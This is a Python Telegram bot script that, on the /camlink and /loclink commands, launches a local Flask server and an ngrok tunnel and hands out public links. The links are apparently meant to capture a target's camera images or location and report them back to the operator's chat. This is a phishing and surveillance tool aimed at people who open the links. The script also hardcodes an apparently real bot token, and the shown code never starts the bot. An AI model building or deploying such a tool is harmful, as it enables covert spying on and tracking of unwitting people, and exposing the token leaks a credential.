import subprocess
import threading
import requests
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import logging

BOT_TOKEN = "8162029368:AAGPkNeKtZKjjqK9_bj0a1VlpviN45HJ-Ws"

logging.basicConfig(level=logging.INFO)

def start_flask():
    subprocess.Popen(["python", "server.py"])

def start_ngrok():
    subprocess.Popen(["ngrok", "http", "5000"])
    import time
    time.sleep(4)
    r = requests.get("http://localhost:4040/api/tunnels")
    return r.json()["tunnels"][0]["public_url"]

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 Use /camlink for camera or /loclink to share location.")

async def camlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    threading.Thread(target=start_flask, daemon=True).start()
    url = start_ngrok()
    link = f"{url}/?id={chat_id}"
    await update.message.reply_text(f"📸 Camera link:\n{link}")

async def loclink(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    threading.Thread(target=start_flask, daemon=True).start()
    url = start_ngrok()
    link = f"{url}/location?id={chat_id}"
    await update.message.reply_text(f"🗺️ Location link:\n{link}")

if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("camlink", camlink))
    app.add_handler(CommandHandler("loclink", loclink))
